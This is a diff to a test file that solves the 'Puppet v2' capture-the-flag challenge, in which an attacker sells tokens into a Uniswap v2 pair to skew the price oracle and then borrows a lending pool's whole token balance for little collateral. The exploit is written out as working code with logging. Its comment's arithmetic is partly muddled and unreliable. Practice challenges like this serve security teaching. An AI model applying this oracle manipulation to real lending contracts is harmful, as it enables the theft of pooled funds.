@@ -81,7 +81,87 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** CODE YOUR EXPLOIT HERE 
+        The solution is:
+        1. Swap the attacker’s DVT token for ETH thus depleting the WETH balance
+        2. Wrap the attacker’s ETH and approve it to the pool
+        3. Borrow all tokens from the pool.
+
+        from the PupperV2Pool, it need to check depositRequired again but this time 
+        use UniswapV2Library.quote in function _getOracleQuote
+   
+        Look at library from https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol
+        function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
+            require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
+            require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
+            amountB = amountA.mul(reserveB) / reserveA;
+        }
+
+        We not see much different from previous challenge because not check if reserveA > reserveB =0
+        amount = amountA, reservesToken = reserveA, reservesWETH = reserveB
+        It means if DVT token > amount*WETH =0
+        In this case, DVT = 10100, WETH=0.09, amount=29.496 => 2.65464/10100 = 0
+        We can lending all tokens from pool without deposit ETH.
+        */
+        console.log("[Begin]");
+        console.log("- Uniswap v2 exchange");
+        console.log("Uni DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); 
+        console.log("Uni WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address))).toString()); 
+        console.log("- Attacker");
+        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
+        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
+        console.log("Attacker WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(attacker.address))).toString()); // attacker WETH
+        
+        const path = [];
+        path[0] = this.token.address;
+        path[1] = this.weth.address;
+
+        // swap all DVT tokens for ETH
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        const timeStamp = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        const tx = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, // Swap lall of the attacker's tokens
+            0,                              // We don't care how much ether we get back. 
+            path,                           // Swap path from token to ether.
+            attacker.address,               // Ether to attacker account.
+            timeStamp                       // Deadline
+        );
+        await tx.wait();
+        
+        console.log("[Attacker sell all DVT to ETH");
+        console.log("- Uniswap v2 exchange");
+        console.log("Uni DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); 
+        console.log("Uni WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address))).toString()); 
+        console.log("- Attacker");
+        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
+        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
+        console.log("Attacker WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(attacker.address))).toString()); // attacker WETH
+        console.log("- Lending Pool");
+        console.log("Pool ETH: " +(ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))).toString()); 
+
+        // Collateral required to borrow all of the pool's DVT is now about 29.5 ether.
+        const collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('Required collateral in eth:', (ethers.utils.formatEther(collateral).toString()));
+        // Convert ether to WETH, give allowance to pool contract and use it to borrow DVT.
+        // Allows borrowing `borrowAmount` of tokens by first depositing their value in WETH
+        // Sender must have approved enough WETH in advance.
+        await this.weth.connect(attacker).deposit({ value: collateral });
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
+        //lend all tokens in pool
+        const tx2 = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        await tx2.wait();
+
+        console.log("[After]");
+        console.log("- Uniswap v2 exchange");
+        console.log("Uni DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); 
+        console.log("Uni WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(this.uniswapExchange.address))).toString()); 
+        console.log("- Attacker");
+        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
+        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
+        console.log("Attacker WETH: " +(ethers.utils.formatEther(await this.weth.balanceOf(attacker.address))).toString()); // attacker WETH
+        console.log("- Lending Pool");
+        console.log("Pool ETH: " +(ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))).toString()); 
+
     });
 
     after(async function () {
